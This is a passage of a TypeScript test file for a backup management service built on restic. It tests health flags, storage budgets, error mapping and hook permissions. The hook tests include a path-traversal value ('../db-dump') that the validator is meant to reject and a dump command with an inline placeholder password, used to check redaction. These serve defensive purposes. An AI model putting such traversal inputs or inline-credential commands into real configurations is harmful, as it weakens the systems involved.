      createdAt: new Date("2026-09-01T00:00:00Z"),
      lastSeenAt: new Date("2026-09-30T11:55:00Z"),
      lastSuccessAt: new Date("2026-09-30T00:00:00Z"),
      settings: {},
      ...overrides,
    }) as Endpoint;
  const green = {
    state: "green",
    checkedAt: now,
    basis: "restore_test",
    overdue: false,
    latestSnapshotId: "a",
    latestBackupAt: now,
  } as const;

  it("is quiet for a healthy endpoint", () => {
    expect(attentionOf(endpoint({}), null, green, now)).toEqual([]);
  });

  it("names a silent server, a failed backup and a failed restore test", () => {
    const silent = endpoint({ lastSeenAt: new Date("2026-09-30T08:00:00Z") });
    const failed = { kind: "backup", status: "failed" } as EndpointRun;
    expect(
      attentionOf(silent, failed, { ...green, state: "red", basis: "restore_test" }, now),
    ).toEqual(["silent", "last_backup_failed", "restore_test_failed"]);
    expect(
      attentionOf(endpoint({}), null, { ...green, state: "red", basis: "repository_check" }, now),
    ).toEqual(["repository_damaged"]);
  });

  it("flags a client by its backups, not its contact", () => {
    const client = endpoint({
      profile: "client",
      lastSeenAt: new Date("2026-09-01T00:00:00Z"),
      lastSuccessAt: new Date("2026-09-10T00:00:00Z"),
    });
    expect(attentionOf(client, null, green, now)).toEqual(["backup_overdue"]);
    expect(attentionOf(endpoint({ lastSeenAt: null }), null, green, now)).toContain("never_seen");
  });

  it("does not call a run the agent only lost to a restart a failed backup", () => {
    const interrupted = {
      kind: "backup",
      status: "failed",
      errors: [{ message: "restarted", code: "interrupted" }],
    } as EndpointRun;
    expect(attentionOf(endpoint({}), interrupted, green, now)).toEqual([]);
    const mixed = {
      ...interrupted,
      errors: [{ message: "x", code: "interrupted" }, { message: "y" }],
    } as EndpointRun;
    expect(attentionOf(endpoint({}), mixed, green, now)).toEqual(["last_backup_failed"]);
  });

  it("flags a run that only lost its agent to a restart in the run list", () => {
    const run = (overrides: Partial<EndpointRun>): EndpointRun =>
      ({
        id: "r1",
        kind: "backup",
        status: "failed",
        startedAt: new Date("2026-09-30T10:00:00Z"),
        finishedAt: new Date("2026-09-30T10:05:00Z"),
        snapshotId: null,
        errors: [{ message: "restarted", code: "interrupted" }],
        failure: null,
        stats: null,
        progress: null,
        ...overrides,
      }) as EndpointRun;
    const summary = (run: EndpointRun) => toRunSummary(run, NO_RATED_TESTS);
    expect(summary(run({})).interruptedOnly).toBe(true);
    expect(
      summary(run({ errors: [{ message: "x", code: "interrupted" }, { message: "y" }] }))
        .interruptedOnly,
    ).toBe(false);
    expect(summary(run({ errors: [] })).interruptedOnly).toBe(false);
    expect(summary(run({ status: "partial" })).interruptedOnly).toBe(false);
    expect(summary(run({ status: "running", errors: [] })).interruptedOnly).toBe(false);
  });

  it("calls a restore test on the machine that rated nothing incomplete, never one a report rated", () => {
    const run = (overrides: Partial<EndpointRun>): EndpointRun =>
      ({
        id: "r1",
        kind: "verify_sample",
        status: "failed",
        startedAt: new Date("2026-09-30T10:00:00Z"),
        finishedAt: new Date("2026-09-30T10:05:00Z"),
        snapshotId: null,
        errors: [{ message: "no space left on device", code: "tmp_unusable" }],
        failure: null,
        stats: null,
        progress: null,
        ...overrides,
      }) as EndpointRun;
    const rated: RatedTests = { runs: new Set(["r-red", "r-green"]), tasks: new Set(["t-red"]) };
    // Could not complete (the agent's own failure, or closed by the monitor): no report on the run.
    expect(toRunSummary(run({}), rated).checkIncomplete).toBe(true);
    expect(
      toRunSummary(
        run({ errors: [{ message: "The agent stopped reporting", code: "agent_stopped" }] }),
        rated,
      ).checkIncomplete,
    ).toBe(true);
    // An agent restart is incomplete as well, and still flagged as interrupted.
    const restarted = toRunSummary(
      run({ errors: [{ message: "stopping", code: "interrupted" }] }),
      rated,
    );
    expect([restarted.checkIncomplete, restarted.interruptedOnly]).toEqual([true, true]);
    // A report rated it: red is proof, green a pass; neither is incomplete.
    expect(toRunSummary(run({ id: "r-red" }), rated).checkIncomplete).toBe(false);
    expect(
      toRunSummary(run({ id: "r-green", status: "succeeded", errors: [] }), rated).checkIncomplete,
    ).toBe(false);
    // Still running, or not a restore test: never.
    expect(toRunSummary(run({ status: "running", errors: [] }), rated).checkIncomplete).toBe(false);
    expect(toRunSummary(run({ kind: "backup" }), rated).checkIncomplete).toBe(false);
    expect(toRunSummary(run({ kind: "restore" }), rated).checkIncomplete).toBe(false);
    expect(toRunDetail(run({}), rated).checkIncomplete).toBe(true);

    const task = (overrides: Partial<EndpointTask>): EndpointTask =>
      ({
        id: "t1",
        kind: "verify_sample",
        status: "failed",
        params: {},
        createdAt: new Date("2026-09-30T09:00:00Z"),
        deliveredAt: null,
        finishedAt: new Date("2026-09-30T10:05:00Z"),
        errorMessage: "expired",
        ...overrides,
      }) as EndpointTask;
    expect(toTask(task({}), rated).checkIncomplete).toBe(true);
    expect(toTask(task({ errorMessage: "agent stopped reporting" }), rated).checkIncomplete).toBe(
      true,
    );
    expect(toTask(task({ id: "t-red" }), rated).checkIncomplete).toBe(false);
    expect(toTask(task({ status: "done", errorMessage: null }), rated).checkIncomplete).toBe(false);
    expect(toTask(task({ status: "pending" }), rated).checkIncomplete).toBe(false);
    expect(toTask(task({ kind: "restore" }), rated).checkIncomplete).toBe(false);
  });

  it("explains each reason: a silent server, an overdue client, a failed run, a damaged repository", () => {
    const silent = endpoint({ lastSeenAt: new Date("2026-09-30T08:00:00Z") });
    const problems = problemsOf(
      silent,
      null,
      { ...green, state: "red", basis: "repository_check" },
      now,
    );
    expect(problems.map((problem) => [problem.attention, problem.failure.code])).toEqual([
      ["silent", "endpoint.silent"],
      ["repository_damaged", "endpoint.repository_damaged"],
    ]);
    expect(problems[0]?.failure.params).toEqual({ ageHours: 4 });
    expect(problems[0]?.failure.steps.map((step) => step.id)).toEqual(["check_endpoint_agent"]);

    const client = endpoint({
      profile: "client",
      lastSeenAt: new Date("2026-09-01T00:00:00Z"),
      lastSuccessAt: new Date("2026-09-10T00:00:00Z"),
    });
    expect(problemsOf(client, null, green, now)[0]?.failure).toMatchObject({
      code: "endpoint.backup_overdue",
      params: { ageDays: 21 },
    });

    const failedRun = {
      kind: "backup",
      status: "failed",
      errors: [{ message: "x", code: "no_paths" }],
      failure: {
        v: 1,
        code: "endpoint.no_paths",
        transient: false,
        params: {},
        technical: {},
        occurredAt: now.toISOString(),
        step: null,
        retry: null,
      },
    } as unknown as EndpointRun;
    expect(problemsOf(endpoint({}), failedRun, green, now)[0]?.failure.code).toBe(
      "endpoint.no_paths",
    );
  });

  it("shows nothing for a revoked endpoint", () => {
    expect(
      attentionOf(endpoint({ status: "revoked", lastSeenAt: null }), null, green, now),
    ).toEqual([]);
  });

  it("fills in the documented defaults for settings", () => {
    expect(effectiveSettings(null)).toEqual({
      retention: { keepDaily: 30, keepWeekly: 12, keepMonthly: 12 },
      staleAfterHours: 2,
      staleAfterDays: 7,
      quotaGib: null,
    });
    expect(effectiveSettings({ staleAfterDays: 14 }).staleAfterDays).toBe(14);
    expect(effectiveSettings({ quotaGib: 200 }).quotaGib).toBe(200);
  });
});

describe("storage use against the budget", () => {
  const GiB = 1024 ** 3;
  const limits = { endpointBytes: 100 * GiB, tenantBytes: 1000 * GiB };
  const now = new Date("2026-10-01T12:00:00Z");
  const row = (overrides: Record<string, unknown> = {}) => ({
    settings: {},
    repositoryBytes: 10 * GiB,
    repositoryMeasuredAt: now,
    quotaRefusedAt: null,
    ...overrides,
  });

  it("shows use, budgets and a level", () => {
    expect(storageOf(row(), 50 * GiB, limits, now)).toEqual({
      usedBytes: 10 * GiB,
      measuredAt: now.toISOString(),
      budgetBytes: 100 * GiB,
      ownBudget: false,
      defaultBudgetBytes: 100 * GiB,
      tenantUsedBytes: 50 * GiB,
      tenantBudgetBytes: 1000 * GiB,
      level: "ok",
      refusedAt: null,
    });
  });

  it("takes the worse of the endpoint's and the tenant's level, and a refusal today", () => {
    expect(storageOf(row({ repositoryBytes: 95 * GiB }), 100 * GiB, limits, now).level).toBe(
      "near",
    );
    expect(storageOf(row(), 990 * GiB, limits, now).level).toBe("near");
    expect(storageOf(row(), 1000 * GiB, limits, now).level).toBe("exceeded");
    expect(storageOf(row({ settings: { quotaGib: 5 } }), 10 * GiB, limits, now)).toMatchObject({
      budgetBytes: 5 * GiB,
      ownBudget: true,
      level: "exceeded",
    });
    const refused = new Date(now.getTime() - 60 * 60 * 1000);
    expect(storageOf(row({ quotaRefusedAt: refused }), 10 * GiB, limits, now).level).toBe(
      "exceeded",
    );
    const longAgo = new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000);
    expect(storageOf(row({ quotaRefusedAt: longAgo }), 10 * GiB, limits, now).level).toBe("ok");
    expect(storageOf(row({ repositoryBytes: null }), 0, limits, now)).toMatchObject({
      usedBytes: null,
      level: "ok",
    });
  });
});

describe("restic failures become problems an admin can act on", () => {
  const error = (failure: ResticError["failure"]) =>
    new ResticError("restic failed", 1, failure, "");

  it("maps busy, missing and rejected repositories", () => {
    expect(resticProblem(error("locked"))).toMatchObject({
      status: 503,
      type: "urn:restow:problem:endpoint-repository-locked",
    });
    expect(resticProblem(error("no_repository"))).toMatchObject({ status: 409 });
    expect(resticProblem(error("wrong_password"))).toMatchObject({ status: 500 });
    expect(resticProblem(error("other"))).toMatchObject({
      status: 502,
      type: "urn:restow:problem:restic-failed",
    });
  });

  it("says restic is missing when it cannot be started", () => {
    expect(
      resticProblem(Object.assign(new Error("spawn restic ENOENT"), { code: "ENOENT" })),
    ).toMatchObject({
      status: 503,
      type: "urn:restow:problem:restic-unavailable",
    });
  });
});

describe("hooks are the machine's decision", () => {
  const set = { pre: "pg_dumpall > /srv/dump.sql" };

  it("refuses hooks for a machine that does not allow them or does not say", () => {
    for (const settings of [{}, { agent: { hooks: "off" as const } }]) {
      expect(() => assertHooksAllowed(set, settings)).toThrowError(
        expect.objectContaining({ status: 409, type: ENDPOINT_PROBLEMS.hooksNotAllowed }),
      );
    }
    // Clearing hooks always works.
    expect(() => assertHooksAllowed({}, {})).not.toThrow();
    expect(() =>
      assertHooksAllowed({ pre: "", post: "" }, { agent: { hooks: "off" } }),
    ).not.toThrow();
  });

  it("takes any command under the any policy and only script names under the scripts policy", () => {
    expect(() => assertHooksAllowed(set, { agent: { hooks: "any" } })).not.toThrow();
    const scripts = { agent: { hooks: "scripts" as const, hookScripts: ["db-dump"] } };
    expect(() => assertHooksAllowed({ pre: "db-dump", post: "cleanup.sh" }, scripts)).not.toThrow();
    for (const hook of [set.pre, "../db-dump", "/etc/restow-agent/hooks.d/db-dump", "a b"]) {
      expect(() => assertHooksAllowed({ pre: hook }, scripts), hook).toThrowError(
        expect.objectContaining({ status: 422, type: ENDPOINT_PROBLEMS.hookNotAScript }),
      );
    }
  });

  it("shows a hook's text only to who may change it, everyone else its fingerprint", () => {
    const config = defaultEndpointConfig("linux", "server", { timeZone: "Europe/Berlin" });
    config.hooks = { pre: "mysqldump -pS3cret db > /srv/db.sql" };
    const hidden = hooksOf(config, { agent: { hooks: "any" } }, false);
    expect(hidden).toEqual({
      policy: "any",
      scripts: [],
      visible: false,
      pre: { set: true, fingerprint: hookFingerprint(config.hooks.pre) },
      post: { set: false, fingerprint: null },
    });
    expect(JSON.stringify(hidden)).not.toContain("S3cret");
    expect(hooksOf(config, {}, true).policy).toBeNull();
    expect(
      hooksOf(config, { agent: { hooks: "scripts", hookScripts: ["db-dump"] } }, true).scripts,
    ).toEqual(["db-dump"]);
  });
});

describe("problem types", () => {
  it("gives every refusal an admin can act on a type of its own", () => {
    const types = Object.values(ENDPOINT_PROBLEMS);
    expect(new Set(types).size).toBe(types.length);
    for (const type of types) {
      expect(type).toMatch(/^urn:restow:problem:[a-z]+(-[a-z]+)*$/);
    }
    // The ones the web app words by type (apps/web features/endpoints presenters.ts).
    expect(ENDPOINT_PROBLEMS.nothingToTest).toBe("urn:restow:problem:endpoint-nothing-to-test");
    expect(ENDPOINT_PROBLEMS.instanceUnknown).toBe("urn:restow:problem:endpoint-instance-unknown");
    expect(ENDPOINT_PROBLEMS.queueNotReady).toBe("urn:restow:problem:endpoint-queue-not-ready");
    expect(ENDPOINT_PROBLEMS.pathNotFound).toBe("urn:restow:problem:endpoint-path-not-found");
    expect(ENDPOINT_PROBLEMS.tokenSettled).toBe("urn:restow:problem:endpoint-token-settled");
  });

  it("keeps the busy answer of the restic gate on its documented type", () => {
    const gate = new ResticGate(1, 1);
    gate.acquire("t1");
    expect(() => gate.acquire("t1")).toThrowError(
      expect.objectContaining({ status: 429, type: ENDPOINT_PROBLEMS.resticBusy }),
    );
  });
});
